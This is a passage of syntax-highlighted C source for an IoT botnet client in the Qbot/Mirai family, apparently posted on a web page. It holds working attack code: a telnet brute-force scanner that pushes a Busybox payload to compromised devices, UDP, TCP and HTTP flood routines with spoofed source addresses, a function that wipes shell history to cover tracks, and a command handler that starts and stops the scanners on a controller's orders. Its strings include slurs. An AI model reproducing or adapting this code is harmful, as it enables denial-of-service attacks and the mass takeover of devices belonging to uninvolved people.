class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, Busybox_Payload, <span class="built_in">strlen</span>(Busybox_Payload), MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line">fds[i].state = <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>: &#123;</span><br><span class="line">fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//sockprintf(mainCommSock, &quot;[ MIRAI ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s&quot;, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span></span><br><span class="line"><span class="comment">//sockprintf(mainCommSock, &quot;[ MIRAI ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s&quot;, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span></span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, Busybox_Payload, <span class="built_in">strlen</span>(Busybox_Payload), MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line">fds[i].complete = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout + <span class="number">60</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span>(fds[i].complete !=<span class="number">3</span>)&#123;</span><br><span class="line">&#125;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sendSTD</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *ip, <span class="keyword">int</span> port, <span class="keyword">int</span> secs)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> iSTD_Sock;</span><br><span class="line">iSTD_Sock = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">time_t</span> start = time(<span class="literal">NULL</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">hp</span>;</span></span><br><span class="line">hp = gethostbyname(ip);</span><br><span class="line">bzero((<span class="keyword">char</span>*) &amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</span><br><span class="line">bcopy(hp-&gt;h_addr, (<span class="keyword">char</span> *) &amp;<span class="built_in">sin</span>.sin_addr, hp-&gt;h_length);</span><br><span class="line"><span class="built_in">sin</span>.sin_family = hp-&gt;h_addrtype;</span><br><span class="line"><span class="built_in">sin</span>.sin_port = port;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">char</span> *randstrings[] = &#123;<span class="string">&quot;VSzNC0CJti3ouku&quot;</span>, <span class="string">&quot;yhJyMAqx7DZa0kg&quot;</span>, <span class="string">&quot;1Cp9MEDMN6B5L1K&quot;</span>, <span class="string">&quot;miraiMIRAI&quot;</span>, <span class="string">&quot;stdflood4&quot;</span>, <span class="string">&quot;7XLPHoxkvL&quot;</span>, <span class="string">&quot;jmQvYBdRZA&quot;</span>, <span class="string">&quot;eNxERkyrfR&quot;</span>, <span class="string">&quot;qHjTXcMbzH&quot;</span>, <span class="string">&quot;chickennuggets&quot;</span>, <span class="string">&quot;ilovecocaine&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="string">&quot;88888888&quot;</span>, <span class="string">&quot;0nnf0l20im&quot;</span>, <span class="string">&quot;uq7ajzgm0a&quot;</span>, <span class="string">&quot;loic&quot;</span>, <span class="string">&quot;ParasJhaIsADumbFag&quot;</span>, <span class="string">&quot;stdudpbasedflood&quot;</span>, <span class="string">&quot;bitcoin1&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="string">&quot;encrypted&quot;</span>, <span class="string">&quot;suckmydick&quot;</span>, <span class="string">&quot;guardiacivil&quot;</span>, <span class="string">&quot;2xoJTsbXunuj&quot;</span>, <span class="string">&quot;QiMH8CGJyOj9&quot;</span>, <span class="string">&quot;abcd1234&quot;</span>, <span class="string">&quot;GLEQWXHAJPWM&quot;</span>, <span class="string">&quot;ABCDEFGHI&quot;</span>, <span class="string">&quot;abcdefghi&quot;</span>, <span class="string">&quot;qbotbotnet&quot;</span>, <span class="string">&quot;lizardsquad&quot;</span>, <span class="string">&quot;aNrjBnTRi&quot;</span>, <span class="string">&quot;1QD8ypG86&quot;</span>, <span class="string">&quot;IVkLWYjLe&quot;</span>, <span class="string">&quot;nexuszetaisacrackaddict&quot;</span>, <span class="string">&quot;satoriskidsnet&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> *STD2_STRING = randstrings[rand() % (<span class="keyword">sizeof</span>(randstrings) / <span class="keyword">sizeof</span>(<span class="keyword">char</span> *))];</span><br><span class="line"><span class="keyword">if</span> (a &gt;= <span class="number">50</span>)</span><br><span class="line">&#123;</span><br><span class="line">send(iSTD_Sock, STD2_STRING, STD_PIGZ, <span class="number">0</span>);</span><br><span class="line">connect(iSTD_Sock,(struct sockaddr *) &amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</span><br><span class="line"><span class="keyword">if</span> (time(<span class="literal">NULL</span>) &gt;= start + secs)</span><br><span class="line">&#123;</span><br><span class="line">close(iSTD_Sock);</span><br><span class="line">_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">a = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">a++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SendUDP</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *target, <span class="keyword">int</span> port, <span class="keyword">int</span> timeEnd, <span class="keyword">int</span> packetsize, <span class="keyword">int</span> pollinterval, <span class="keyword">int</span> spoofit)</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_addr</span>;</span></span><br><span class="line">        dest_addr.sin_family = AF_INET;</span><br><span class="line">        <span class="keyword">if</span>(port == <span class="number">0</span>) dest_addr.sin_port = rand_cmwc();</span><br><span class="line">        <span class="keyword">else</span> dest_addr.sin_port = htons(port);</span><br><span class="line">        <span class="keyword">if</span>(getHost(target, &amp;dest_addr.sin_addr)) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">memset</span>(dest_addr.sin_zero, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> dest_addr.sin_zero);</span><br><span class="line">        <span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> pollRegister;</span><br><span class="line">        pollRegister = pollinterval;	</span><br><span class="line">                <span class="keyword">int</span> sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);</span><br><span class="line">                <span class="keyword">if</span>(!sockfd) &#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">int</span> tmp = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &amp;tmp, <span class="keyword">sizeof</span> (tmp)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">int</span> counter = <span class="number">50</span>;</span><br><span class="line">                <span class="keyword">while</span>(counter--) &#123;</span><br><span class="line">                        srand(time(<span class="literal">NULL</span>) ^ rand_cmwc());</span><br><span class="line">                        init_rand(rand());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">in_addr_t</span> netmask;</span><br><span class="line">                netmask = ( ~((<span class="number">1</span> &lt;&lt; (<span class="number">32</span> - spoofit)) - <span class="number">1</span>) );</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">char</span> packet[<span class="keyword">sizeof</span>(struct iphdr) + <span class="keyword">sizeof</span>(struct udphdr) + packetsize];</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span> =</span> (struct iphdr *)packet;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">udphdr</span> *<span class="title">udph</span> =</span> (<span class="keyword">void</span> *)iph + <span class="keyword">sizeof</span>(struct iphdr);</span><br><span class="line">                makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, <span class="keyword">sizeof</span>(struct udphdr) + packetsize);</span><br><span class="line">                udph-&gt;len = htons(<span class="keyword">sizeof</span>(struct udphdr) + packetsize);</span><br><span class="line">                udph-&gt;source = rand_cmwc();</span><br><span class="line">                udph-&gt;dest = (port == <span class="number">0</span> ? rand_cmwc() : htons(port));</span><br><span class="line">                udph-&gt;check = <span class="number">0</span>;</span><br><span class="line">                makeRandomStr((<span class="keyword">unsigned</span> <span class="keyword">char</span>*)(((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)udph) + <span class="keyword">sizeof</span>(struct udphdr)), packetsize);</span><br><span class="line">                iph-&gt;check = csum ((<span class="keyword">unsigned</span> <span class="keyword">short</span> *) packet, iph-&gt;tot_len);</span><br><span class="line">                <span class="keyword">int</span> end = time(<span class="literal">NULL</span>) + timeEnd;</span><br><span class="line">                <span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">                        sendto(sockfd, packet, <span class="keyword">sizeof</span>(packet), <span class="number">0</span>, (struct sockaddr *)&amp;dest_addr, <span class="keyword">sizeof</span>(dest_addr));</span><br><span class="line">                        udph-&gt;source = rand_cmwc();</span><br><span class="line">                        udph-&gt;dest = (port == <span class="number">0</span> ? rand_cmwc() : htons(port));</span><br><span class="line">                        iph-&gt;id = rand_cmwc();</span><br><span class="line">                        iph-&gt;saddr = htonl( getRandomIP(netmask) );</span><br><span class="line">                        iph-&gt;check = csum ((<span class="keyword">unsigned</span> <span class="keyword">short</span> *) packet, iph-&gt;tot_len);</span><br><span class="line">                        <span class="keyword">if</span>(i == pollRegister) &#123;</span><br><span class="line">                                <span class="keyword">if</span>(time(<span class="literal">NULL</span>) &gt; end) <span class="keyword">break</span>;</span><br><span class="line">                                i = <span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        i++;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SendTCP</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *target, <span class="keyword">int</span> port, <span class="keyword">int</span> timeEnd, <span class="keyword">unsigned</span> <span class="keyword">char</span> *flags, <span class="keyword">int</span> packetsize, <span class="keyword">int</span> pollinterval, <span class="keyword">int</span> spoofit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> pollRegister;</span><br><span class="line">        pollRegister = pollinterval;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_addr</span>;</span></span><br><span class="line">        dest_addr.sin_family = AF_INET;</span><br><span class="line">        <span class="keyword">if</span>(port == <span class="number">0</span>) dest_addr.sin_port = rand_cmwc();</span><br><span class="line">        <span class="keyword">else</span> dest_addr.sin_port = htons(port);</span><br><span class="line">        <span class="keyword">if</span>(getHost(target, &amp;dest_addr.sin_addr)) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">memset</span>(dest_addr.sin_zero, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> dest_addr.sin_zero);</span><br><span class="line">        <span class="keyword">int</span> sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);</span><br><span class="line">        <span class="keyword">if</span>(!sockfd) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &amp;tmp, <span class="keyword">sizeof</span> (tmp)) &lt; <span class="number">0</span>) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">        <span class="keyword">in_addr_t</span> netmask;</span><br><span class="line">        <span class="keyword">if</span> ( spoofit == <span class="number">0</span> ) netmask = ( ~((<span class="keyword">in_addr_t</span>) <span class="number">-1</span>) );</span><br><span class="line">        <span class="keyword">else</span> netmask = ( ~((<span class="number">1</span> &lt;&lt; (<span class="number">32</span> - spoofit)) - <span class="number">1</span>) );</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> packet[<span class="keyword">sizeof</span>(struct iphdr) + <span class="keyword">sizeof</span>(struct tcphdr) + packetsize];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span> =</span> (struct iphdr *)packet;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">tcph</span> =</span> (<span class="keyword">void</span> *)iph + <span class="keyword">sizeof</span>(struct iphdr);</span><br><span class="line">        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, <span class="keyword">sizeof</span>(struct tcphdr) + packetsize);</span><br><span class="line">        tcph-&gt;source = rand_cmwc();</span><br><span class="line">        tcph-&gt;seq = rand_cmwc();</span><br><span class="line">        tcph-&gt;ack_seq = <span class="number">0</span>;</span><br><span class="line">        tcph-&gt;doff = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(flags, <span class="string">&quot;all&quot;</span>)) &#123;</span><br><span class="line">                tcph-&gt;syn = <span class="number">1</span>;</span><br><span class="line">                tcph-&gt;rst = <span class="number">1</span>;</span><br><span class="line">                tcph-&gt;fin = <span class="number">1</span>;</span><br><span class="line">                tcph-&gt;ack = <span class="number">1</span>;</span><br><span class="line">                tcph-&gt;psh = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">char</span> *pch = strtok(flags, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">                <span class="keyword">while</span>(pch) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(pch,         <span class="string">&quot;syn&quot;</span>)) &#123; tcph-&gt;syn = <span class="number">1</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(pch,  <span class="string">&quot;rst&quot;</span>)) &#123; tcph-&gt;rst = <span class="number">1</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(pch,  <span class="string">&quot;fin&quot;</span>)) &#123; tcph-&gt;fin = <span class="number">1</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(pch,  <span class="string">&quot;ack&quot;</span>)) &#123; tcph-&gt;ack = <span class="number">1</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(pch,  <span class="string">&quot;psh&quot;</span>)) &#123; tcph-&gt;psh = <span class="number">1</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                        pch = strtok(<span class="literal">NULL</span>, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        tcph-&gt;window = rand_cmwc();</span><br><span class="line">        tcph-&gt;check = <span class="number">0</span>;</span><br><span class="line">        tcph-&gt;urg_ptr = <span class="number">0</span>;</span><br><span class="line">        tcph-&gt;dest = (port == <span class="number">0</span> ? rand_cmwc() : htons(port));</span><br><span class="line">        tcph-&gt;check = tcpcsum(iph, tcph);</span><br><span class="line">        iph-&gt;check = csum ((<span class="keyword">unsigned</span> <span class="keyword">short</span> *) packet, iph-&gt;tot_len);</span><br><span class="line">        <span class="keyword">int</span> end = time(<span class="literal">NULL</span>) + timeEnd;</span><br><span class="line">        <span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">                sendto(sockfd, packet, <span class="keyword">sizeof</span>(packet), <span class="number">0</span>, (struct sockaddr *)&amp;dest_addr, <span class="keyword">sizeof</span>(dest_addr));</span><br><span class="line">                iph-&gt;saddr = htonl( getRandomIP(netmask) );</span><br><span class="line">                iph-&gt;id = rand_cmwc();</span><br><span class="line">                tcph-&gt;seq = rand_cmwc();</span><br><span class="line">                tcph-&gt;source = rand_cmwc();</span><br><span class="line">                tcph-&gt;check = <span class="number">0</span>;</span><br><span class="line">                tcph-&gt;check = tcpcsum(iph, tcph);</span><br><span class="line">                iph-&gt;check = csum ((<span class="keyword">unsigned</span> <span class="keyword">short</span> *) packet, iph-&gt;tot_len);</span><br><span class="line">                <span class="keyword">if</span>(i == pollRegister) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(time(<span class="literal">NULL</span>) &gt; end) <span class="keyword">break</span>;</span><br><span class="line">                        i = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                i++;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket_connect</span><span class="params">(<span class="keyword">char</span> *host, <span class="keyword">in_port_t</span> port)</span> </span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">hp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">	<span class="keyword">int</span> on = <span class="number">1</span>, sock;     </span><br><span class="line">	<span class="keyword">if</span> ((hp = gethostbyname(host)) == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	bcopy(hp-&gt;h_addr, &amp;addr.sin_addr, hp-&gt;h_length);</span><br><span class="line">	addr.sin_port = htons(port);</span><br><span class="line">	addr.sin_family = AF_INET;</span><br><span class="line">	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">	setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;on, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">	<span class="keyword">if</span> (sock == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (connect(sock, (struct sockaddr *)&amp;addr, <span class="keyword">sizeof</span>(struct sockaddr_in)) == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> sock;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SendHTTP</span><span class="params">(<span class="keyword">char</span> *method, <span class="keyword">char</span> *host, <span class="keyword">in_port_t</span> port, <span class="keyword">char</span> *path, <span class="keyword">int</span> timeEnd, <span class="keyword">int</span> power)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> socket, i, end = time(<span class="literal">NULL</span>) + timeEnd, sendIP = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> request[<span class="number">512</span>], buffer[<span class="number">1</span>];</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; power; i++) &#123;</span><br><span class="line">		<span class="built_in">sprintf</span>(request, <span class="string">&quot;%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n&quot;</span>, method, path, host, useragents[(rand() % <span class="number">36</span>)]);</span><br><span class="line">		<span class="keyword">if</span> (fork()) &#123;</span><br><span class="line">			<span class="keyword">while</span> (end &gt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line">				socket = socket_connect(host, port);</span><br><span class="line">				<span class="keyword">if</span> (socket != <span class="number">0</span>) &#123;</span><br><span class="line">					write(socket, request, <span class="built_in">strlen</span>(request));</span><br><span class="line">					read(socket, buffer, <span class="number">1</span>);</span><br><span class="line">					close(socket);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearHistory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">&quot;history -c;history -w&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;cd /;rm -rf ~/.bash_history&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RandomPythonRange</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//GET TO THIS SHIT LATER.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">processCmd</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">unsigned</span> <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;TRANGE&quot;</span>)) &#123;</span><br><span class="line">			<span class="keyword">if</span>(argc &lt; <span class="number">2</span> || atoi(argv[<span class="number">1</span>]) == <span class="number">-1</span>)&#123;</span><br><span class="line">			sockprintf(mainCommSock, <span class="string">&quot;RANGE &lt;option 0-idk&gt;&quot;</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			sockprintf(mainCommSock, <span class="string">&quot;Telnet Range %d-&gt;%d&quot;</span>, telnetrange, atoi(argv[<span class="number">1</span>]));</span><br><span class="line">			telnetrange = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">			&#125; </span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;TELNET&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;ON&quot;</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">uint32_t</span> parent;</span><br><span class="line">				parent = fork();        </span><br><span class="line">				<span class="keyword">int</span> ii = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">int</span> forks = sysconf( _SC_NPROCESSORS_ONLN );</span><br><span class="line">				<span class="keyword">int</span> fds = <span class="number">999999</span>;</span><br><span class="line">				<span class="keyword">if</span>(forks == <span class="number">1</span>) fds = <span class="number">500</span>;</span><br><span class="line">				<span class="keyword">if</span>(forks &gt;= <span class="number">2</span>) fds = <span class="number">1000</span>;</span><br><span class="line">				<span class="keyword">if</span> (parent &gt; <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					scanPid = parent;</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(parent == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">				<span class="keyword">for</span> (ii = <span class="number">0</span>; ii &lt; forks; ii++)</span><br><span class="line">				&#123;</span><br><span class="line">					srand((time(<span class="literal">NULL</span>) ^ getpid()) + getppid());</span><br><span class="line">					init_rand(time(<span class="literal">NULL</span>) ^ getpid());</span><br><span class="line">					TelnetScanner(<span class="number">100</span>, fds);</span><br><span class="line">					_exit(<span class="number">0</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;OFF&quot;</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(scanPid == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">				kill(scanPid, <span class="number">9</span>);</span><br><span class="line">				scanPid = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;Scanner&quot;</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">int</span> threads = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">				<span class="keyword">int</span> usec = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">				<span class="keyword">if</span>(!listFork())</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="comment">//sockprintf(mainCommSock, &quot;[TELNET] Starting Fastload.&quot;);</span></span><br><span class="line">					TelnetScanner(usec, threads);</span><br><span class="line">					_exit(<span class="number">0</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;MIRAI&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;ON&quot;</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">uint32_t</span> parent;</span><br><span class="line">				parent = fork();        </span><br><span class="line">				<span class="keyword">int</span> ii = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">int</span> forks = sysconf( _SC_NPROCESSORS_ONLN );</span><br><span class="line">				<span class="keyword">int</span> fds = <span class="number">999999</span>;</span><br><span class="line">				<span class="keyword">if</span>(forks == <span class="number">1</span>) fds = <span class="number">500</span>;</span><br><span class="line">				<span class="keyword">if</span>(forks &gt;= <span class="number">2</span>) fds = <span class="number">1000</span>;</span><br><span class="line">				<span class="keyword">if</span> (parent &gt; <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					miraiPid = parent;</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(parent == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">				<span class="keyword">for</span> (ii = <span class="number">0</span>; ii &lt; forks; ii++)</span><br><span class="line">				&#123;</span><br><span class="line">					srand((time(<span class="literal">NULL</span>) ^ getpid()) + getppid());</span><br><span class="line">					init_rand(time(<span class="literal">NULL</span>) ^ getpid());</span><br><span class="line">					MiraiScanner(<span class="number">100</span>, fds);</span><br><span class="line">					_exit(<span class="number">0</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;OFF&quot;</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(miraiPid == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">				kill(miraiPid, <span class="number">9</span>);</span><br><span class="line">				miraiPid = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;FASTLOAD&quot;</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">int</span> threads = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">				<span class="keyword">int</span> usec = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">				<span class="keyword">if</span>(!listFork())</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="comment">//sockprintf(mainCommSock, &quot;Starting scanner!!&quot;);</span></span><br><span class="line">					MiraiScanner(usec, threads);</span><br><span class="line">					_exit(<span class="number">0</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">&#125;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;MRANGE&quot;</span>)) &#123;</span><br><span class="line">		